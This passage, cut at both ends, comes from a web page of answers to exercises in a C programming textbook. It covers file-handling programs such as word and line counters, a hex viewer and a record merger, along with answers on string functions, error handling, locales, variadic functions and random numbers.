only */</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">{</span><br><span class="line">  FILE *fp;</span><br><span class="line">  int ch, count = 0;</span><br><span class="line">  bool in_word;</span><br><span class="line"> </span><br><span class="line">  if (argc != 2) {</span><br><span class="line">    fprintf(stderr, "usage: cntword file\n");</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  if ((fp = fopen(argv[1], "r")) == NULL) {</span><br><span class="line">    fprintf(stderr, "Can't open %s\n", argv[1]);</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  in_word = false;</span><br><span class="line">  while ((ch = getc(fp)) != EOF)</span><br><span class="line">    if (isspace(ch))</span><br><span class="line">      in_word = false;</span><br><span class="line">    else if (!in_word) {</span><br><span class="line">      in_word = true;</span><br><span class="line">      count++;</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">  printf("There are %d words in %s\n", count, argv[1]);</span><br><span class="line"> </span><br><span class="line">  fclose(fp);</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(c) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">{</span><br><span class="line">  FILE *fp;</span><br><span class="line">  int ch, count = 0;</span><br><span class="line"> </span><br><span class="line">  if (argc != 2) {</span><br><span class="line">    fprintf(stderr, "usage: cntline file\n");</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  if ((fp = fopen(argv[1], "r")) == NULL) {</span><br><span class="line">    fprintf(stderr, "Can't open %s\n", argv[1]);</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  while((ch = getc(fp)) != EOF)</span><br><span class="line">    if (ch == '\n')</span><br><span class="line">      count++;</span><br><span class="line"> </span><br><span class="line">  printf("There are %d lines in %s\n", count, argv[1]);</span><br><span class="line"> </span><br><span class="line">  fclose(fp);</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>6.</strong> [was #16; modified] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;ctype.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">{</span><br><span class="line">  FILE *fp;</span><br><span class="line">  int i, n, offset;</span><br><span class="line">  unsigned char buffer[10];</span><br><span class="line"> </span><br><span class="line">  if (argc != 2) {</span><br><span class="line">    fprintf(stderr, "usage: viewfile file\n");</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  if ((fp = fopen(argv[1], "rb")) == NULL) {</span><br><span class="line">    fprintf(stderr, "Can't open %s\n", argv[1]);</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  printf("Offset              Bytes              Characters\n");</span><br><span class="line">  printf("------  -----------------------------  ----------\n");</span><br><span class="line"> </span><br><span class="line">  for (offset = 0;; offset += 10) {</span><br><span class="line">    n = fread(buffer, 1, 10, fp);</span><br><span class="line">    if (n == 0)</span><br><span class="line">      break;</span><br><span class="line"> </span><br><span class="line">    printf("%6d  ", offset);</span><br><span class="line">    for (i = 0; i &lt; n; i++)</span><br><span class="line">      printf("%.2X ", buffer[i]);</span><br><span class="line">    for (; i &lt; 10; i++)</span><br><span class="line">      printf("   ");</span><br><span class="line">    printf(" ");</span><br><span class="line">    for (i = 0; i &lt; n; i++) {</span><br><span class="line">      if (!isprint(buffer[i]))</span><br><span class="line">        buffer[i] = '.';</span><br><span class="line">      printf("%c", buffer[i]);</span><br><span class="line">    }</span><br><span class="line">    printf("\n");</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  fclose(fp);</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>9.</strong> [was #20] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"> </span><br><span class="line">#define NAME_LEN 25</span><br><span class="line"> </span><br><span class="line">struct part {</span><br><span class="line">  int number;</span><br><span class="line">  char name[NAME_LEN + 1];</span><br><span class="line">  int on_hand;</span><br><span class="line">};</span><br><span class="line"> </span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">{</span><br><span class="line">  FILE *in_fp1, *in_fp2, *out_fp;</span><br><span class="line">  int num_read1, num_read2;</span><br><span class="line">  struct part part1, part2;</span><br><span class="line"> </span><br><span class="line">  if (argc != 4) {</span><br><span class="line">    fprintf(stderr, "usage: merge infile1 infile2 outfile\n");</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  if ((in_fp1 = fopen(argv[1], "rb")) == NULL) {</span><br><span class="line">    fprintf(stderr, "Can't open %s\n", argv[1]);</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  if ((in_fp2 = fopen(argv[2], "rb")) == NULL) {</span><br><span class="line">    fprintf(stderr, "Can't open %s\n", argv[2]);</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  if ((out_fp = fopen(argv[3], "wb")) == NULL) {</span><br><span class="line">    fprintf(stderr, "Can't open %s\n", argv[3]);</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  num_read1 = fread(&amp;part1, sizeof(struct part), 1, in_fp1);</span><br><span class="line">  num_read2 = fread(&amp;part2, sizeof(struct part), 1, in_fp2);</span><br><span class="line">  while (num_read1 == 1 &amp;&amp; num_read2 == 1)</span><br><span class="line">    /* successfully read records from both files */</span><br><span class="line">    if (part1.number &lt; part2.number) {</span><br><span class="line">      fwrite(&amp;part1, sizeof(struct part), 1, out_fp);</span><br><span class="line">      num_read1 = fread(&amp;part1, sizeof(struct part), 1, in_fp1);</span><br><span class="line">    } else if (part1.number &gt; part2.number) {</span><br><span class="line">      fwrite(&amp;part2, sizeof(struct part), 1, out_fp);</span><br><span class="line">      num_read2 = fread(&amp;part2, sizeof(struct part), 1, in_fp2);</span><br><span class="line">    } else {</span><br><span class="line">      /* part numbers are equal */</span><br><span class="line">      if (strcmp(part1.name, part2.name) != 0)</span><br><span class="line">        fprintf(stderr,</span><br><span class="line">                "Names don't match for part %d; using the name %s\n",</span><br><span class="line">                part1.number, part1.name);</span><br><span class="line">      part1.on_hand += part2.on_hand;</span><br><span class="line">      fwrite(&amp;part1, sizeof(struct part), 1, out_fp);</span><br><span class="line">      num_read1 = fread(&amp;part1, sizeof(struct part), 1, in_fp1);</span><br><span class="line">      num_read2 = fread(&amp;part2, sizeof(struct part), 1, in_fp2);</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">  /* copy rest of file1 to output file */</span><br><span class="line">  while (num_read1 == 1) {</span><br><span class="line">    fwrite(&amp;part1, sizeof(struct part), 1, out_fp);</span><br><span class="line">    num_read1 = fread(&amp;part1, sizeof(struct part), 1, in_fp1);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  /* copy rest of file2 to output file */</span><br><span class="line">  while (num_read2 == 1) {</span><br><span class="line">    fwrite(&amp;part2, sizeof(struct part), 1, out_fp);</span><br><span class="line">    num_read2 = fread(&amp;part2, sizeof(struct part), 1, in_fp2);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  fclose(in_fp1);</span><br><span class="line">  fclose(in_fp2);</span><br><span class="line">  fclose(out_fp);</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Chapter-23"><a href="#Chapter-23" class="headerlink" title="Chapter 23"></a>Chapter 23</h3><h4 id="Answers-to-Selected-Exercises-18"><a href="#Answers-to-Selected-Exercises-18" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>1.</strong> [was #2; modified] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">double round_nearest(double x, int n)</span><br><span class="line">{</span><br><span class="line">  double power = pow(10.0, n);</span><br><span class="line"> </span><br><span class="line">  if (x &lt; 0.0)</span><br><span class="line">    return ceil(x * power - 0.5) / power;</span><br><span class="line">  else</span><br><span class="line">    return floor(x * power + 0.5) / power;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>6.</strong> [was #6] </p><p>(a) <code>memmove</code><br> (b) <code>memmove</code> (we can’t use <code>strcpy</code> because its behavior is undefined when the source of the copy overlaps with the destination)<br> (c) <code>strncpy</code><br> (d) <code>memcpy</code> </p><p><strong>8.</strong> [was #8] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int numchar(const char *s, char ch)</span><br><span class="line">{</span><br><span class="line">  int count = 0;</span><br><span class="line"> </span><br><span class="line">  s = strchr(s, ch);</span><br><span class="line">  while (s != NULL) {</span><br><span class="line">    count++;</span><br><span class="line">    s = strchr(s + 1, ch);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  return count;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>10.</strong> [was #10] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (strstr("foo#bar#baz", str) != NULL) …</span><br></pre></td></tr></tbody></table></figure><p>The assumptions are that <code>str</code> is at least three characters long and doesn’t contain the <code>#</code> character. </p><p><strong>11.</strong> [was #12] <code>memset(&amp;s[strlen(s)-n], '!', n);</code> </p><h4 id="Answers-to-Selected-Programming-Projects-10"><a href="#Answers-to-Selected-Programming-Projects-10" class="headerlink" title="Answers to Selected Programming Projects"></a>Answers to Selected Programming Projects</h4><p><strong>2.</strong> [was #4; modified] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;ctype.h&gt;</span><br><span class="line">#include &lt;stdbool.h&gt;   /* C99 only */</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  bool nonblank_seen = false;</span><br><span class="line">  int ch;</span><br><span class="line"> </span><br><span class="line">  while ((ch = getchar()) != EOF) {</span><br><span class="line">    if (nonblank_seen)</span><br><span class="line">      putchar(ch);</span><br><span class="line">    else if (!isspace(ch)) {</span><br><span class="line">      nonblank_seen = true;</span><br><span class="line">      putchar(ch);</span><br><span class="line">    }</span><br><span class="line">    if (ch == '\n')</span><br><span class="line">      nonblank_seen = false;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Chapter-24"><a href="#Chapter-24" class="headerlink" title="Chapter 24"></a>Chapter 24</h3><h4 id="Answers-to-Selected-Exercises-19"><a href="#Answers-to-Selected-Exercises-19" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>4.</strong> [was #2] </p><p>(a) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">double try_math_fcn(double (*f)(double), double x, const char *msg)</span><br><span class="line">{</span><br><span class="line">  double result;</span><br><span class="line"> </span><br><span class="line">  errno = 0;</span><br><span class="line">  result = (*f)(x);</span><br><span class="line">  if (errno != 0) {</span><br><span class="line">    perror(msg);</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line">  return result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(b) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define TRY_MATH_FCN(f,x) try_math_fcn(f, x, "Error in call of " #f)</span><br></pre></td></tr></tbody></table></figure><p><strong>5.</strong> [was #4] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  char code;</span><br><span class="line"> </span><br><span class="line">  for (;;) {</span><br><span class="line">    setjmp(env);</span><br><span class="line">    printf("Enter operation code: ");</span><br><span class="line">    scanf(" %c", &amp;code);</span><br><span class="line">    while (getchar() != '\n')   /* skips to end of line */</span><br><span class="line">      ;</span><br><span class="line">    switch (code) {</span><br><span class="line">      case 'i': insert();</span><br><span class="line">                break;</span><br><span class="line">      case 's': search();</span><br><span class="line">                break;</span><br><span class="line">      case 'u': update();</span><br><span class="line">                break;</span><br><span class="line">      case 'p': print();</span><br><span class="line">                break;</span><br><span class="line">      case 'q': return 0;</span><br><span class="line">      default:  printf("Illegal code\n");</span><br><span class="line">    }</span><br><span class="line">    printf("\n");</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>The <code>jmp_buf</code> variable <code>env</code> will need to be global, rather than local to <code>main</code>, so that the function performing the <code>longjmp</code> will be able to supply it as an argument.</p><h3 id="Chapter-25"><a href="#Chapter-25" class="headerlink" title="Chapter 25"></a>Chapter 25</h3><h4 id="Answers-to-Selected-Exercises-20"><a href="#Answers-to-Selected-Exercises-20" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>6.</strong> [was #4; modified] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">while ((orig_char = getchar()) != EOF) ??&lt;</span><br><span class="line">  new_char = orig_char ??' KEY;</span><br><span class="line">  if (isprint(orig_char) &amp;&amp; isprint(new_char))</span><br><span class="line">    putchar(new_char);</span><br><span class="line">  else</span><br><span class="line">    putchar(orig_char);</span><br><span class="line">??&gt;</span><br></pre></td></tr></tbody></table></figure><h4 id="Answers-to-Selected-Programming-Projects-11"><a href="#Answers-to-Selected-Programming-Projects-11" class="headerlink" title="Answers to Selected Programming Projects"></a>Answers to Selected Programming Projects</h4><p><strong>1.</strong> [was #2] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;locale.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  char *temp, *C_locale;</span><br><span class="line"> </span><br><span class="line">  temp = setlocale(LC_ALL, NULL);</span><br><span class="line">    /* "C" is the current locale by default */</span><br><span class="line">  if (temp == NULL) {</span><br><span class="line">    printf("\"C\" locale information not available\n");</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  C_locale = malloc(strlen(temp) + 1);</span><br><span class="line">  if (C_locale == NULL) {</span><br><span class="line">    printf("Can't allocate space to store locale information\n");</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  strcpy(C_locale, temp);</span><br><span class="line"> </span><br><span class="line">  temp = setlocale(LC_ALL, "");</span><br><span class="line">  if (temp == NULL) {</span><br><span class="line">    printf("Native locale information not available\n");</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  if (strcmp(temp, C_locale) == 0)</span><br><span class="line">    printf("Native locale is the same as the \"C\" locale\n");</span><br><span class="line">  else</span><br><span class="line">    printf("Native locale is not the same as the \"C\" locale\n");</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Chapter-26"><a href="#Chapter-26" class="headerlink" title="Chapter 26"></a>Chapter 26</h3><h4 id="Answers-to-Selected-Exercises-21"><a href="#Answers-to-Selected-Exercises-21" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>2.</strong> [was #2] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">void int_printf(const char *format, ...)</span><br><span class="line">{</span><br><span class="line">  va_list ap;</span><br><span class="line">  const char *p;</span><br><span class="line">  int digit, i, power, temp;</span><br><span class="line"> </span><br><span class="line">  va_start(ap, format);</span><br><span class="line"> </span><br><span class="line">  for (p = format; *p != '\0'; p++) {</span><br><span class="line">    if (*p != '%') {</span><br><span class="line">      putchar(*p);</span><br><span class="line">      continue;</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">    if (*++p == 'd') {</span><br><span class="line">      i = va_arg(ap, int);</span><br><span class="line">      if (i &lt; 0) {</span><br><span class="line">        i = -i;</span><br><span class="line">        putchar('-');</span><br><span class="line">      }</span><br><span class="line"> </span><br><span class="line">      temp = i;</span><br><span class="line">      power = 1;</span><br><span class="line">      while (temp &gt; 9) {</span><br><span class="line">        temp /= 10;</span><br><span class="line">        power *= 10;</span><br><span class="line">      }</span><br><span class="line"> </span><br><span class="line">      do {</span><br><span class="line">        digit = i / power;</span><br><span class="line">        putchar(digit + '0');</span><br><span class="line">        i -= digit * power;</span><br><span class="line">        power /= 10;</span><br><span class="line">      } while (i &gt; 0);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  va_end(ap);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>7.</strong> [was #4] The statement converts the string that <code>p</code> points to into a long integer, storing the result in <code>value</code>. <code>p</code> is left pointing to the first character not included in the conversion. The base used for the conversion is 10. </p><p><strong>9.</strong> [was #6] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">double rand_double(void)</span><br><span class="line">{</span><br><span class="line">  return (double) rand() / (RAND_MAX + 1);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="Answers-to-Selected-Programming-Projects-12"><a href="#Answers-to-Selected-Programming-Projects-12" class="headerlink" title="Answers to Selected Programming Projects"></a>Answers to Selected Programming Projects</h4><p><strong>1.</strong> [was #8] </p><p>(a) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  int count = 1000;</span><br><span class="line"> </span><br><span class="line">  while (count-- &gt; 0)</span><br><span class="line">    printf("%d", rand() &amp; 1);</span><br><span class="line">  printf("\n");</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(b) For generating numbers in the range 0 to <code>N</code> <code>-</code> <code>1</code>, the formula <code>rand()</code> <code>/</code> <code>(RAND_MAX</code> <code>/</code> <code>N</code> <code>+</code> <code>1)</code> often gives better results than <code>rand()</code> <code>%</code> <code>N</code>. For example, if <code>N</code> is 2 and <code>RAND_MAX</code> is 32767, the formula works out to <code>rand()</code> <code>/</code> 16384, which yields 0 if the return value of <code>rand</code> is less than 16384 and 1 if it’s greater than or equal to 16384. </p><p><strong>3.</strong> [was #10; modified] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line"> </span><br><span class="line">#define N 1000</span><br><span class="line"> </span><br><span class="line">int compare_ints(const void *p, const void *q);</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  int a[N], i;</span><br><span class="line">  clock_t start_clock;</span><br><span class="line"> </span><br><span class="line">  for (i = 0; i &lt; N; i++)</span><br><span class="line">    a[i] = N - i;</span><br><span class="line"> </span><br><span class="line">  start_clock = clock();</span><br><span class="line">  qsort(a, N, sizeof(a[0]), compare_ints);</span><br><span class="line"> </span><br><span class="line">  printf("Time used to sort %d integers: %g sec.\n", N,</span><br><span class="line">         (clock() - start_clock) / (double) CLOCKS_PER_SEC);</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">int compare_ints(const void *p, const void *q)</span><br><span class="line">{</span><br><span class="line">  return *(int *)p - *(int *)q;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>4.</strong> [was #12] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 